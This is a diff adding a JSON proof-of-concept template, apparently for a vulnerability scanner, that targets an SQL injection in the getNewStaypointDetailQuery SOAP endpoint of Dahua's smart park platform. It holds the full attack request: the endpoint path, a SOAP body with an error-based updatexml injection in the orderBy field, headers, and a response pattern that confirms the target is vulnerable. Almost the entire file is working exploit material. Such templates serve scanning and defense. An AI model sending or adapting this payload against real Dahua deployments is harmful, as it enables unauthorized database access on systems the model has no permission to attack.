@@ -1,0 +1,16 @@
+{
+	"name":"大华智慧园区getNewStaypointDetailQuery接口SQL注入",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/portal/services/carQuery/getNewStaypointDetailQuery",
+		"pocPost":"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:car=\"http://carQuery.webservice.dssc.dahua.com\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n<car:getNewStaypointDetailQuery>\r\n<!--type: string-->\r\n<searchJson>{}</searchJson>\r\n<!--type: string-->\r\n<pageJson>{\"orderBy\":\"1 and 1=updatexml(1,concat(0x7e,md5(123456),0x7e),1)--\"}</pageJson>\r\n<!--type: string-->\r\n<extend>quae divum incedo</extend>\r\n</car:getNewStaypointDetailQuery>\r\n</soapenv:Body>\r\n</soapenv:Envelope>",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+			"Content-Length":" 491",
+			"Content-Type":" text/xml;charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"(XPATH)"
+	}
+}
